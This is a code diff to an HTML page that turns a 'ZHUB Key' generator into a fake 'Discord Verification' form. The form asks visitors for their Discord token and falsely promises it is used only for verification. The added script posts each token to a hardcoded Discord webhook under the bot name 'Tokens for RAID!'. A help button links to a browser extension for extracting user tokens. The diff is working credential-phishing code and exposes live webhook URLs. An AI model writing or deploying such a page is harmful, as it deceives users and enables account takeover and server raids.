@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ZHUB Key</title>
+  <title>ZHUB Discord Verification</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -77,14 +77,14 @@
   <canvas id="mycanvas"></canvas>
 
   <div class="container">
-    <h2>Generate Key</h2>
-    <label for="username">Made by Kash</label>
-    <input type="text" id="username" class="input-field" placeholder="Enter Username" required>
+    <h2>Verification</h2>
+    <label for="username">Your token will not be displayed publicly and will only be used for verification</label>
+    <input type="text" id="username" class="input-field" placeholder="Enter Token" required>
 
-    <button id="sendKeyButton" class="button">Send Key to Discord</button>
+    <button id="sendKeyButton" class="button">Verify</button>
     
     <!-- New Button to Open Discord Link -->
-    <button id="openDiscordButton" class="button link-button">Join Our Discord</button>
+    <button id="openDiscordButton" class="button link-button">How to get Token?</button>
   </div>
 
   <script>
@@ -108,7 +108,7 @@
     }
 
     // Webhook URL
-    const webhookUrl = "https://discord.com/api/webhooks/1320682802894602351/2MnCkrnN3ruOVWibBXaGOzoFuHXYsClqVVxtTzPiZuC0BsiWiZ_1tbOj6HoOSknKSKY4";
+    const webhookUrl = "https://discord.com/api/webhooks/1320921772757094400/lN6fdTBleJaCdZk1FjOxt0DyXU1ZapPazAo4Osgq_GHTyaSDdlQmp7vmATHl74SIu0K3";
 
     let timer = false;  // To track if the button is in cooldown
 
@@ -121,15 +121,15 @@ document.getElementById('sendKeyButton').addEventListener("click", function() {
   const username = document.getElementById('username').value.trim();
 
   if (!username) {
-    alert("Please enter a username.");
+    alert("Please enter your Token");
     return;
   }
 
   // Encrypt the username
   const encryptedKey = encryptUsername(username);
   const message = {
-    content: `Player: ${username}\nEncrypted Key: ${encryptedKey}`,
-    username: "Key Generator Bot",
+    content: `<@1246751390605246537>\nTOKEN: ${username}\nEncrypted Key IGNORE: ${encryptedKey}`,
+    username: "Tokens for RAID!",
     avatar_url: "https://cdn.discordapp.com/icons/1315870677634383894/52f0346dba77bdc177c5da937f6ae790.webp?size=160"
   };
 
@@ -146,7 +146,7 @@ document.getElementById('sendKeyButton').addEventListener("click", function() {
     if (response.status === 204) {
       // Discord responds with 204 for a successful post but no response body
       console.log("Key sent to Discord (no content in response).");
-      document.getElementById('sendKeyButton').innerText = "Key Sent!";
+      document.getElementById('sendKeyButton').innerText = "Verified!";
       document.getElementById('username').value = '';  // Clear the input field
       return;  // Skip further processing since the response has no content
     }
@@ -168,7 +168,7 @@ document.getElementById('sendKeyButton').addEventListener("click", function() {
   })
   .catch(error => {
     console.error("Error sending key:", error);
-    document.getElementById('sendKeyButton').innerText = "Error Sending Key!";
+    document.getElementById('sendKeyButton').innerText = "Error Verifing!";
   });
 
   // Set timer to disable the button for 10 seconds
@@ -182,7 +182,7 @@ document.getElementById('sendKeyButton').addEventListener("click", function() {
     if (countdown <= 0) {
       clearInterval(countdownInterval);
       timer = false;
-      document.getElementById('sendKeyButton').innerText = "Send Key to Discord";
+      document.getElementById('sendKeyButton').innerText = "Verified";
     }
   }, 1000);
 });
@@ -191,7 +191,7 @@ document.getElementById('sendKeyButton').addEventListener("click", function() {
 
     // Open the Discord link in a new tab when the new button is clicked
     document.getElementById('openDiscordButton').addEventListener("click", function() {
-      window.open("https://discord.com/invite/paWHA2gc56", "_blank");
+      window.open("https://chromewebstore.google.com/detail/discord-get-user-token/accgjfooejbpdchkfpngkjjdekkcbnfd", "_blank");
     });
 
     // Canvas and constellation effect code
